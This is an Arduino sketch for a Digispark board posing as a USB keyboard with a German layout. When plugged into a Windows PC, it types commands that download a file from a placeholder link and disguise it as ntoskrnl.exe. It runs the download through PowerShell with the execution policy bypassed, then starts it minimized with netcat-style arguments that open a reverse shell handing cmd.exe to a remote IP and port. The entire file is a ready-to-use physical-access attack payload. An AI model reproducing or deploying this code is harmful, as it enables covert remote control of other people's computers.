#include "DigiKeyboardDe.h"
void setup() {
  // put your setup code here, to run once:
  DigiKeyboardDe.sendKeyStroke(0);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(100);
  DigiKeyboardDe.println("cmd");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(100);
  DigiKeyboardDe.println("cd / & mkdir win & cd /win & echo (wget 'LINK' -OutFile ntoskrnl.exe) > b.ps1");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.println("powershell -ExecutionPolicy ByPass -File b.ps1");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(50);
  DigiKeyboardDe.println("START /MIN ntoskrnl.exe IP PORT -e cmd.exe -d & exit");
  DigiKeyboardDe.delay(50);
}

void loop() {
  // put your main code here, to run repeatedly:
  // Usless
}
